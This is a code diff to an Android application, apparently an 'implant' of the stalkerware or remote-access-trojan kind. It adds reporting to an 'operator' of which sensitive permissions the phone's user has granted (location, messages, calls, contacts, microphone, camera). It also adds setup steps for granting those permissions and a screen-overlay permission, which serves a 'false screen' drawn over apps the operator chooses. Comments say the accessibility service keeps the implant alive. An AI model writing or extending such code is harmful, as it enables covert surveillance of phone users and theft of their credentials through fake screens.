@@ -134,6 +134,17 @@ object Vendor {
         // operator the screen of the phone, so the guide says whether it is
         // on.
         out["accessibility"] = Ui.isEnabled().toString()
+        // The dangerous permissions of the senses: the operator has to
+        // know which of them the user of the phone granted.
+        val permissions = Sense.permissions(context)
+        var granted = 0
+        for ((key, value) in permissions) {
+            out["perm_$key"] = value.toString()
+            if (value) granted++
+        }
+        out["permissions"] = "$granted of ${permissions.size} granted"
+        // The overlay of the false screen is a permission of its own.
+        out["overlay"] = Sense.granted(context, android.Manifest.permission.SYSTEM_ALERT_WINDOW).toString()
         return out
     }
 
@@ -215,6 +226,39 @@ object Vendor {
                 why = "the accessibility service keeps the implant alive, and it is the only way to see what the user is looking at; the user of the phone sees it in the settings",
                 state = if (Ui.isEnabled()) "yes" else "no",
                 action = Settings.ACTION_ACCESSIBILITY_SETTINGS,
+            ),
+        )
+
+        val permissions = Sense.permissions(context)
+        val missing = permissions.filter { !it.value }.keys.toList()
+        out.add(
+            Step(
+                id = "permissions",
+                title = "let the implant use the senses of the phone",
+                why = "the location, the messages, the calls, the contacts, the microphone and the camera are behind permissions that only the user of the phone can grant" +
+                    if (missing.isEmpty()) {
+                        ""
+                    } else {
+                        "; the missing ones are ${missing.joinToString(", ")}"
+                    },
+                state = if (missing.isEmpty()) "yes" else "no",
+                action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
+                data = "package:$packageName",
+            ),
+        )
+
+        out.add(
+            Step(
+                id = "overlay",
+                title = "let the implant draw over the other applications",
+                why = "the false screen of the phone is drawn over the application the operator named; the permission is in the settings of the phone",
+                state = if (Sense.granted(context, android.Manifest.permission.SYSTEM_ALERT_WINDOW)) {
+                    "yes"
+                } else {
+                    "no"
+                },
+                action = Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                data = "package:$packageName",
             ),
         )
 
